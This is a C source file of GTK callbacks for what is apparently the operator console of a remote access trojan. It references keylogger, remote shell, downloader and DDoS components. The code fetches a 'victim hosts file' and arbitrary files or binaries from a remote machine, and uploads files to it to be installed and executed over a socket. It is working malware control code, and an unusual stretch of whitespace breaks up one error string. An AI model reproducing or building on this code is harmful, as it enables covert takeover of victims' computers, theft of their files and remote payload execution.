                                                                                                                                                                                     #include <stdio.h>
#include <stdlib.h>
#include <string.h>  //strlen()

#include <sys/types.h>  // send()
#include <sys/socket.h>  // send()
#include <netinet/in.h>  // SOCKADDR_IN
#include <arpa/inet.h>  // inet_addr()
#include <netdb.h>  //gethostbyaddr()

#include <gtk-2.0/gtk/gtk.h>

#include "../includes/constants.h"
#include "../includes/callbacks_main.h"
#include "../includes/keylogger.h"
#include "../includes/utils.h"
#include "../includes/remote_shell.h"
#include "../includes/downloader.h"


GtkWidget *main_win;

const gchar *chemin;
GtkWidget *upload_entry;

const gchar *server_ip;
const gchar *server_port;
int port;

SOCKET remote_shell_sock;

GtkWidget *text_view;
GtkWidget *rs_text_iew;
GtkWidget *ddos_text_view;
GtkWidget *hosts_text_view = NULL;
GtkWidget *zone[6];

/** TAB : Main **/
void cb_get_server_ip(GtkButton *button, gpointer user_data)
{
    server_ip = gtk_entry_get_text(GTK_ENTRY(user_data));

    /* unsed parameters */
    (void)button;
}

void cb_get_server_port(GtkButton *button, gpointer user_data)
{
    server_port = gtk_entry_get_text(GTK_ENTRY(user_data));

    /* unsed parameters */
    (void)button;
}

void cb_open_file(GtkButton *button, gpointer user_data)
{
    GtkWidget *fileSelect = NULL;

    fileSelect = gtk_file_selection_new("Select your file");

    gtk_file_selection_set_filename(GTK_FILE_SELECTION(fileSelect), "/");

    gtk_widget_show(fileSelect);

    g_signal_connect(GTK_FILE_SELECTION(fileSelect)->ok_button, "clicked", G_CALLBACK(cb_get_path), fileSelect);
    g_signal_connect_swapped(G_OBJECT(GTK_FILE_SELECTION(fileSelect)->cancel_button), "clicked", G_CALLBACK(gtk_widget_destroy), fileSelect);

    /* unused parameters */
    (void)button;
    (void)user_data;

    return;
}

void cb_get_path(GtkWidget *button, GtkWidget *file_selection)
{
    //const gchar *chemin = NULL;

    chemin = gtk_file_selection_get_filename(GTK_FILE_SELECTION(file_selection));

    g_signal_connect_swapped(GTK_FILE_SELECTION(file_selection)->ok_button, "clicked", G_CALLBACK(get_file_name), file_selection);
    g_signal_connect_swapped(GTK_FILE_SELECTION(file_selection)->cancel_button, "clicked", G_CALLBACK(gtk_widget_destroy), file_selection);

    gtk_widget_destroy(file_selection);

    get_file_name();

    /* unsed parameters */
    (void)button;

    return;
}


void cb_files_downloader(GtkButton *button, gpointer user_data)
{
    GtkWidget *downloader_dialog = NULL;
    GtkWidget *downloader_entry = NULL;
    const gchar *file_path = NULL;
    
    GtkWidget *progress_bar_text = NULL;
    GtkWidget *pbar_hbox = NULL;

    GtkTextBuffer *text_buffer = NULL;
    gchar *text = NULL;
    GtkTextIter start;
    GtkTextIter end;
    
    GtkWidget *files_infos;

    files_infos = gtk_message_dialog_new(GTK_WINDOW(main_win), GTK_DIALOG_MODAL, GTK_MESSAGE_WARNING , GTK_BUTTONS_YES_NO, "With this option you can download scripts and text files.\nFor download video, executable, music and so on please use the option : Download Binary.\nClose this window ?");
    
    gtk_widget_show_all(GTK_DIALOG(files_infos)->vbox);
    switch(gtk_dialog_run(GTK_DIALOG(files_infos)))
    {
        case GTK_RESPONSE_YES:
            gtk_widget_destroy(files_infos);
            return;
        
        case GTK_RESPONSE_NO:
            gtk_widget_destroy(files_infos);
            break;
        
        default : 
            gtk_widget_destroy(files_infos);
            return;
    }
    
    

    downloader_dialog = gtk_dialog_new_with_buttons("Download files", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
    gtk_widget_set_size_request(downloader_dialog, 360, 100);
    
    downloader_entry = gtk_entry_new();
    gtk_entry_set_text(GTK_ENTRY(downloader_entry), "Enter the full path of the file to download (path + filename)");

    gtk_box_pack_start(GTK_BOX(GTK_DIALOG(downloader_dialog)->vbox), downloader_entry, TRUE, FALSE, 0);
    
    pbar_hbox = gtk_hbox_new(TRUE, 0);
    progress_bar_text = gtk_progress_bar_new();
    gtk_widget_set_size_request(progress_bar_text, 130, 10);
    
    gtk_progress_set_format_string (GTK_PROGRESS(progress_bar_text), "%p%%");
    
    gtk_progress_set_show_text(GTK_PROGRESS(progress_bar_text), TRUE);
    
    gtk_box_pack_start(GTK_BOX(GTK_DIALOG(downloader_dialog)->vbox), progress_bar_text, TRUE, FALSE, 0);

    gtk_widget_show_all(GTK_DIALOG(downloader_dialog)->vbox);
    switch(gtk_dialog_run(GTK_DIALOG(downloader_dialog)))
    {
        case GTK_RESPONSE_APPLY:
            file_path = gtk_entry_get_text(GTK_ENTRY(downloader_entry));
            download_files(file_path, progress_bar_text,downloader_dialog );
            gtk_widget_destroy(downloader_dialog);
            break;

        default :
            gtk_widget_destroy(downloader_dialog);
            break;
    }

    /* unsed parameters */
    (void)button;
    (void)user_data;

    return;
}

void cb_binaries_downloader(GtkButton *button, gpointer user_data)
{
    GtkWidget *downloader_dialog = NULL;
    GtkWidget *downloader_entry = NULL;
    const gchar *file_path = NULL;
    
    GtkWidget *progress_bar_binary = NULL;
    GtkWidget *pbar_hbox = NULL;
    
    
    downloader_dialog = gtk_dialog_new_with_buttons("Download Binairies", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
    gtk_widget_set_size_request(downloader_dialog, 360, 100);

    downloader_entry = gtk_entry_new();
    gtk_entry_set_text(GTK_ENTRY(downloader_entry), "Enter the full path of the binarie file to download (path + filename)");
    gtk_box_pack_start(GTK_BOX(GTK_DIALOG(downloader_dialog)->vbox), downloader_entry, TRUE, FALSE, 0);
    
    pbar_hbox = gtk_hbox_new(TRUE, 0);
    progress_bar_binary = gtk_progress_bar_new();
    gtk_widget_set_size_request(progress_bar_binary, 130, 10);
    
    gtk_progress_set_format_string (GTK_PROGRESS(progress_bar_binary), "%p%%");
    gtk_progress_set_show_text(GTK_PROGRESS(progress_bar_binary), TRUE);
    
    gtk_box_pack_start(GTK_BOX(GTK_DIALOG(downloader_dialog)->vbox), progress_bar_binary, TRUE, FALSE, 0);

    gtk_widget_show_all(GTK_DIALOG(downloader_dialog)->vbox);
    switch(gtk_dialog_run(GTK_DIALOG(downloader_dialog)))
    {
        case GTK_RESPONSE_APPLY:
            file_path = gtk_entry_get_text(GTK_ENTRY(downloader_entry));
            download_binaries(file_path, progress_bar_binary);
            gtk_widget_destroy(downloader_dialog);
            break;

        default :
            gtk_widget_destroy(downloader_dialog);
            break;
    }

    /* unsed parameters */
    (void)button;
    (void)user_data;

    return;
}

void cb_hosts_downloader(GtkButton *button, gpointer user_data)
{
    GtkWidget *download_hosts_dialog = NULL;

    download_hosts_dialog = gtk_message_dialog_new (GTK_WINDOW(main_win), GTK_DIALOG_MODAL, GTK_MESSAGE_QUESTION, GTK_BUTTONS_YES_NO, "Ready to download victim hosts file ?");

    switch(gtk_dialog_run(GTK_DIALOG(download_hosts_dialog)))
    {
        case GTK_RESPONSE_YES:
            gtk_widget_destroy(download_hosts_dialog);
            download_hosts_files();
            break;

        case GTK_RESPONSE_NO:
            gtk_widget_destroy(download_hosts_dialog);
            break;
    }

    /* unsed parameters */
    (void)button;
    (void)user_data;

    return;
}

void cb_open_hosts(GtkButton *button, gpointer user_data)
{
    GtkWidget *fileSelect = NULL;

    fileSelect = gtk_file_selection_new("Select your file");

    gtk_file_selection_set_filename(GTK_FILE_SELECTION(fileSelect), user_data);

    gtk_widget_show(fileSelect);

    g_signal_connect(GTK_FILE_SELECTION(fileSelect)->ok_button, "clicked", G_CALLBACK(cb_hosts_get_path), fileSelect);
    g_signal_connect_swapped(G_OBJECT(GTK_FILE_SELECTION(fileSelect)->cancel_button), "clicked", G_CALLBACK(gtk_widget_destroy), fileSelect);

    /* unsed parameters */
    (void)button;

    return;
}


void cb_hosts_get_path(GtkWidget *button, GtkWidget *file_selection)
{
    const gchar *hosts_path = NULL;

    hosts_path = gtk_file_selection_get_filename(GTK_FILE_SELECTION(file_selection));

    g_signal_connect_swapped(GTK_FILE_SELECTION(file_selection)->ok_button, "clicked", G_CALLBACK(text_view_editor), file_selection);
    g_signal_connect_swapped(GTK_FILE_SELECTION(file_selection)->cancel_button, "clicked", G_CALLBACK(gtk_widget_destroy), file_selection);

    gtk_widget_destroy(file_selection);

    text_view_editor(hosts_path, file_selection);

    /* unsed parameters */
    (void)button;

    return;
}


/** Menu options of open file window text editor **/
void cb_OnQuitter(GtkButton *button, gpointer user_data)
{
    GtkWidget *question;

    question = gtk_message_dialog_new(GTK_WINDOW(user_data), GTK_DIALOG_MODAL, GTK_MESSAGE_QUESTION, GTK_BUTTONS_YES_NO, "Do you really want to quit this window ?");

    switch(gtk_dialog_run(GTK_DIALOG(question)))
    {
        case GTK_RESPONSE_YES:
            gtk_widget_destroy(question);
            gtk_widget_destroy(user_data);
            break;

        case GTK_RESPONSE_NONE:
            break;

        case GTK_RESPONSE_NO:
            gtk_widget_destroy(question);

            break;
    }

    /* unsed parameters */
    (void)button;

    return;
}

void cb_OnOpen(GtkButton *button, gpointer user_data)
{
    GtkWidget *fileSelect = NULL;

    fileSelect = gtk_file_selection_new("Select your file");

    gtk_file_selection_set_filename(GTK_FILE_SELECTION(fileSelect), "/");

    gtk_widget_show(fileSelect);

    g_signal_connect(GTK_FILE_SELECTION(fileSelect)->ok_button, "clicked", G_CALLBACK(cb_get_file_path), fileSelect);
    g_signal_connect_swapped(G_OBJECT(GTK_FILE_SELECTION(fileSelect)->cancel_button), "clicked", G_CALLBACK(gtk_widget_destroy), fileSelect);

    /* unsed parameters */
    (void)button;
    (void)user_data;

    return;
}

void cb_get_file_path(GtkWidget *button, GtkWidget *file_selection)
{
    //const gchar *chemin = NULL;

    chemin = gtk_file_selection_get_filename(GTK_FILE_SELECTION(file_selection));

    g_signal_connect_swapped(GTK_FILE_SELECTION(file_selection)->ok_button, "clicked", G_CALLBACK(text_view_editor), file_selection);
    g_signal_connect_swapped(GTK_FILE_SELECTION(file_selection)->cancel_button, "clicked", G_CALLBACK(gtk_widget_destroy), file_selection);

    gtk_widget_destroy(file_selection);

    text_view_editor(chemin, file_selection);

    /* unsed parameters */
    (void)button;

    return;
}

void cb_get_file_path_save(GtkWidget *button, GtkWidget *file_selection)
{
    //const gchar *chemin = NULL;

    FILE *fichier = NULL;

    chemin = gtk_file_selection_get_filename(GTK_FILE_SELECTION(file_selection));

    g_signal_connect_swapped(GTK_FILE_SELECTION(file_selection)->ok_button, "clicked", G_CALLBACK(cb_OnSave), file_selection);
    g_signal_connect_swapped(GTK_FILE_SELECTION(file_selection)->cancel_button, "clicked", G_CALLBACK(gtk_widget_destroy), file_selection);

    gtk_widget_destroy(file_selection);

    fichier = fopen(chemin, "w");
    if(fichier)
    {
        gchar *contents = NULL;
        gchar *locale = NULL;
        GtkTextIter start;
        GtkTextIter end;
        GtkTextBuffer *p_text_buffer = NULL;

        p_text_buffer = gtk_text_view_get_buffer(GTK_TEXT_VIEW(hosts_text_view));

        gtk_text_buffer_get_bounds(p_text_buffer, &start, &end);

        contents = gtk_text_buffer_get_text(p_text_buffer, &start, &end, FALSE);
        locale = g_locale_from_utf8(contents, -1, NULL, NULL, NULL);

        g_free(contents);
        contents = NULL;

        fprintf(fichier, "%s", locale);

        g_free(locale);
        locale = NULL;

        fclose(fichier);
        fichier = NULL;
    }

    /* unsed parameters */
    (void)button;

    return;
}

void cb_OnSave(GtkButton *button, gpointer user_data)
{

    GtkWidget *fileSelect = NULL;

    fileSelect = gtk_file_selection_new("Save File");

    gtk_file_selection_set_filename(GTK_FILE_SELECTION(fileSelect), "/");

    gtk_widget_show(fileSelect);

    g_signal_connect(GTK_FILE_SELECTION(fileSelect)->ok_button, "clicked", G_CALLBACK(cb_get_file_path_save), fileSelect);
    g_signal_connect_swapped(G_OBJECT(GTK_FILE_SELECTION(fileSelect)->cancel_button), "clicked", G_CALLBACK(gtk_widget_destroy), fileSelect);

    /* unsed parameters */
    (void)button;
    (void)user_data;
}

/*  Text editor window for print out the hosts files */
void text_view_editor(const gchar *chemin, GtkWidget *fileSelect)
{
    //GtkWidget *hosts_text_view = NULL;
    GtkWidget *editorWindow = NULL;
    GtkWidget *hBox = NULL;
    GtkWidget *scrollbar;

    GtkWidget *menu_bar = NULL;
    GtkWidget *menu = NULL;
    GtkWidget *menu_item = NULL;
    GtkWidget *vBox = NULL;


    editorWindow = gtk_window_new(GTK_WINDOW_TOPLEVEL);
    gtk_window_set_default_size(GTK_WINDOW(editorWindow), 800, 600);
    //g_signal_connect(G_OBJECT(editorWindow), "destroy", G_CALLBACK(gtk_main_quit), NULL);
    gtk_window_set_title(GTK_WINDOW(editorWindow), chemin);

    vBox = gtk_vbox_new(FALSE, 0);
    gtk_container_add(GTK_CONTAINER(editorWindow), vBox);

    /** Editor window menus **/
    menu_bar = gtk_menu_bar_new();
    menu = gtk_menu_new();

    /* GtkImageMenuItem */
    menu_item = gtk_image_menu_item_new_from_stock(GTK_STOCK_OPEN,NULL);
    g_signal_connect(G_OBJECT(menu_item), "activate", G_CALLBACK(cb_OnOpen), (GtkWidget*)editorWindow);
    gtk_menu_shell_append(GTK_MENU_SHELL(menu), menu_item);

    menu_item = gtk_image_menu_item_new_from_stock(GTK_STOCK_SAVE,NULL);
    g_signal_connect(G_OBJECT(menu_item), "activate", G_CALLBACK(cb_OnSave), (GtkWidget*)editorWindow);
    gtk_menu_shell_append(GTK_MENU_SHELL(menu), menu_item);

    menu_item = gtk_image_menu_item_new_from_stock(GTK_STOCK_CLOSE,NULL);
    g_signal_connect(G_OBJECT(menu_item), "activate", G_CALLBACK(cb_OnQuitter), (GtkWidget*)editorWindow);
    gtk_menu_shell_append(GTK_MENU_SHELL(menu), menu_item);

    /* GtkSeparatorItem */
    menu_item = gtk_separator_menu_item_new();
    gtk_menu_shell_append(GTK_MENU_SHELL(menu), menu_item);

    menu_item = gtk_menu_item_new_with_label("File");
    gtk_menu_item_set_submenu(GTK_MENU_ITEM(menu_item), menu);
    gtk_menu_shell_append(GTK_MENU_SHELL(menu_bar), menu_item);

    /* Ajout du menu a la fenêtre */
    gtk_box_pack_start(GTK_BOX(vBox), menu_bar, FALSE, FALSE, 0);

    //gtk_widget_set_size_request(menu_bar, 0, 30);

    hBox = gtk_hbox_new(FALSE, 5);
    gtk_container_add(GTK_CONTAINER(vBox), hBox);

    scrollbar = gtk_scrolled_window_new(NULL, NULL);
    gtk_box_pack_start(GTK_BOX(hBox), scrollbar, TRUE, TRUE, 5);

    hosts_text_view = gtk_text_view_new();
    gtk_container_add(GTK_CONTAINER(scrollbar), hosts_text_view);
    gtk_scrolled_window_set_policy(GTK_SCROLLED_WINDOW(scrollbar), GTK_POLICY_AUTOMATIC, GTK_POLICY_AUTOMATIC);

    gtk_widget_show_all(editorWindow);

    open_hosts_file(hosts_text_view, chemin, fileSelect);
}

/*  Open the log file in a window */
void open_hosts_file(GtkWidget *hosts_text_view, const gchar *chemin, GtkWidget *fileSelect)
{
    GtkTextBuffer *file_text_buffer;
    GtkTextIter iStart;
    GtkTextIter iEnd;
    FILE *hosts = NULL;
    gchar lecture[MAXDATASIZE];

    file_text_buffer = gtk_text_view_get_buffer(GTK_TEXT_VIEW(hosts_text_view));

    hosts = fopen(chemin,"r");

    if(hosts == NULL)
    {
        GtkWidget *dialog;

        dialog = gtk_message_dialog_new(GTK_WINDOW(fileSelect), GTK_DIALOG_MODAL, GTK_MESSAGE_ERROR, GTK_BUTTONS_OK, "Can't open the file : \n%s", g_locale_to_utf8(chemin, -1, NULL, NULL, NULL));
        gtk_dialog_run(GTK_DIALOG(dialog));
        gtk_widget_destroy(dialog);
        gtk_widget_destroy(fileSelect);

        return;
    }

    gtk_text_buffer_get_start_iter(file_text_buffer,&iStart);
    gtk_text_buffer_get_end_iter(file_text_buffer,&iEnd);
    gtk_text_buffer_delete(file_text_buffer, &iStart, &iEnd);

    while(fgets(lecture, MAXDATASIZE, hosts))
    {
        gtk_text_buffer_get_end_iter(file_text_buffer, &iEnd);
        gtk_text_buffer_insert(file_text_buffer, &iEnd, g_locale_to_utf8(lecture, -1, NULL, NULL, NULL), -1);
    }

    fclose(hosts);
}

void cb_files_uploader(GtkButton *button, gpointer user_data)
{
    SOCKET sock = 0;
    SOCKADDR_IN sin;

    struct hostent *he = NULL;
    struct in_addr ipv4addr;

    long weight = 0;
    int err = 0;
    size_t flag = 7;
    
    GtkWidget *progress_bar_upload = NULL;
    GtkWidget *pbar_hbox = NULL;
    gdouble step_foreward = 0.0;

    long dataSend = 0;
    long dataRead = 0;
    long totalSend = 0;
    char buffer[BUFSIZ] = {0};

    const char *log_name = NULL;
    size_t len_log_name = 0;

    FILE *log = NULL;
    GtkWidget *confirmation_script_dialog = NULL;
    GtkWidget *installing_script_dialog = NULL;
    int installed = 0;

    GtkTextBuffer *text_buffer = NULL;
    gchar *text = NULL;
    GtkTextIter start;
    GtkTextIter end;

    port = atoi(server_port);

    inet_pton(AF_INET, server_ip, &ipv4addr);
    he = gethostbyaddr(&ipv4addr, sizeof ipv4addr, AF_INET);

    sin.sin_addr = *((struct in_addr *)he->h_addr);
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if(sock == INVALID_SOCKET)
    {
        error("socket()", "cb_files_upload                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              er()");
        exit(-1);
    }

    err = connect(sock, (SOCKADDR*)&sin, sizeof(sin));

    if(err == SOCKET_ERROR)
    {
        error("connect()", "cb_files_uploader()");
        exit(-1);
    }

    if(send(sock, (char*)&flag, sizeof(flag), 0) == SOCKET_ERROR)
    {
        error("send() flag", "cb_files_uploader()");
        exit(-1);
    }

    log = fopen(chemin, "rb");
    if(log == NULL)
    {
        error("fopen() log", "cb_files_uploader()");
        exit(-1);
    }

    /* weight of the app file */
    fseek(log, 0, SEEK_END);
    weight = ftell(log);
    rewind(log);

    if(send(sock, (char*)&weight, sizeof(weight), 0) == SOCKET_ERROR)
    {
        error("send() file weight", "cb_files_uploader()");
        exit(-1);
    }
    
    printf("Poid du fichier envoyé : %ld\n", weight);

    log_name = gtk_entry_get_text(GTK_ENTRY(upload_entry));

    len_log_name = strlen(log_name) + 1;

    if(send(sock, (char*)&len_log_name, sizeof(len_log_name), 0) == SOCKET_ERROR)
    {
        error("send() len_log_name", "cb_files_uploader()");
        exit(-1);
    }

    if(send(sock, log_name, len_log_name, 0) == SOCKET_ERROR)
    {
        error("send() log_name", "cb_files_uploader()");
        exit(-1);
    }
    
    installing_script_dialog = gtk_message_dialog_new(GTK_WINDOW(main_win), GTK_DIALOG_MODAL, GTK_MESSAGE_QUESTION , GTK_BUTTONS_YES_NO, "Install files on remote machine ?");
    
    gtk_widget_set_size_request(installing_script_dialog, 360, 150);
    
    pbar_hbox = gtk_hbox_new(TRUE, 0);
    progress_bar_upload = gtk_progress_bar_new();
    gtk_widget_set_size_request(progress_bar_upload, 130, 10);
    
    gtk_progress_set_format_string (GTK_PROGRESS(progress_bar_upload), "%p%%");
    
    gtk_progress_set_show_text(GTK_PROGRESS(progress_bar_upload), TRUE);
    
    gtk_box_pack_start(GTK_BOX(GTK_DIALOG(installing_script_dialog)->vbox), progress_bar_upload, TRUE, FALSE, 0);
    
    
    gtk_widget_show_all(GTK_DIALOG(installing_script_dialog)->vbox);
    switch(gtk_dialog_run(GTK_DIALOG(installing_script_dialog)))
    {
        case GTK_RESPONSE_YES:
        {
            
            /** Obtaining the buffer associated with the widget. **/
            text_buffer = gtk_text_view_get_buffer((GtkTextView*)(text_view));

            /** Set the default buffer text. **/
            gtk_text_buffer_set_text(text_buffer, "File have been uploaded ...\nNow installing, it can goes from 10 min to more than 45 min !\nSo please be patient ...  \nGo smoke a cig or something similar and come back ...", -1);

            /** Obtain iters for the start and end of points of the buffer **/
            gtk_text_buffer_get_start_iter(text_buffer, &start);
            gtk_text_buffer_get_end_iter(text_buffer, &end);

            /** Get the entire buffer text. **/
            text = gtk_text_buffer_get_text(text_buffer, &start, &end, FALSE);

            /** Print the text **/
            g_print("%s", text);    

            //g_free(text);
            
            gtk_progress_bar_set_fraction(GTK_PROGRESS_BAR(progress_bar_upload), 0.0);
            
            gtk_grab_add(installing_script_dialog);

            do
            {
                dataRead = fread(buffer, sizeof(char), sizeof(weight), log);
                if(dataRead < 0)
                {
                    error("send() dataRead", "cb_files_uploader()");
                    exit(-1);
                }

                dataSend = send(sock, buffer, sizeof(weight), 0);
                if(dataSend == 0)
                {
                    error("send() dataSend", "cb_files_uploader()");
                    exit(-1);
                }

                totalSend += dataSend;

                step_foreward = ((gdouble)totalSend * 1.0) / (gdouble)weight;

                if(step_foreward > 1.0)
                    step_foreward = 1.0;

                gtk_progress_bar_set_fraction(GTK_PROGRESS_BAR(progress_bar_upload), step_foreward);
                gtk_main_iteration();

            }while(totalSend < weight);

            gtk_grab_remove(installing_script_dialog);

            //printf("fichier envoyé avec success : %ld\n", totalSend);
        
            gtk_widget_destroy(installing_script_dialog);
            break;          
        }
        
        case GTK_RESPONSE_NO:
            gtk_widget_destroy(installing_script_dialog);
            return;
        
        default :
            gtk_widget_destroy(installing_script_dialog);
            return;
    }
 
    if(recv(sock, (char*)&installed, sizeof(installed), 0) == SOCKET_ERROR)
    {
        error("recv() installed", "cb_files_uploader()");
        exit(-1);
    }

    if(installed == 1)
    {
        /** Obtaining the buffer associated with the widget. **/
        text_buffer = gtk_text_view_get_buffer(GTK_TEXT_VIEW(text_view));

        /** Set the default buffer text. **/
        gtk_text_buffer_set_text(text_buffer, "File have been installed / executed ...", -1);

        /** Obtain iters for the start and end of points of the buffer **/
        gtk_text_buffer_get_start_iter(text_buffer, &start);
        gtk_text_buffer_get_end_iter(text_buffer, &end);

        /** Get the entire buffer text. **/
        text = gtk_text_buffer_get_text(text_buffer, &start, &end, FALSE);

        /** Print the text **/
        g_print("%s", text);

        g_free(text);

        confirmation_script_dialog = gtk_message_dialog_new (GTK_WINDOW(main_win), GTK_DIALOG_MODAL, GTK_MESSAGE_INFO, GTK_BUTTONS_NONE, "File have been installed / executed");

        switch(gtk_dialog_run(GTK_DIALOG(confirmation_script_dialog)))
        {
            default :
                gtk_widget_destroy(confirmation_script_dialog);
                break;
        }
    }

    else if(installed == 0)
    {
        /** Obtaining the buffer associated with the widget. **/
        text_buffer = gtk_text_view_get_buffer(GTK_TEXT_VIEW(text_view));

        /** Set the default buffer text. **/
        gtk_text_buffer_set_text(text_buffer, "File encountered an installation problem ...", -1);

        /** Obtain iters for the start and end of points of the buffer **/
        gtk_text_buffer_get_start_iter(text_buffer, &start);
        gtk_text_buffer_get_end_iter(text_buffer, &end);

        /** Get the entire buffer text. **/
        text = gtk_text_buffer_get_text(text_buffer, &start, &end, FALSE);

        /** Print the text **/
        g_print("%s", text);

        g_free(text);
    }

    /* unsed parameters */
    (void)button;
    (void)user_data;

    return;
}


